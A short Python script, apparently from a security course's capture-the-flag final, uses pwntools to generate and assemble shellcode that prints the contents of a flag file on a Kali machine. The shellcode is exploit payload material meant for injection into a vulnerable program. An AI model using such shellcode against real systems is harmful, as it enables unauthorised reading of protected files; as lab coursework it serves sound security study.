from pwn import *

fp = "/home/kali/HACS208N_Final/flag.txt"
shellcode = shellcraft.cat(fp)

bin = asm(shellcode)
print(bin)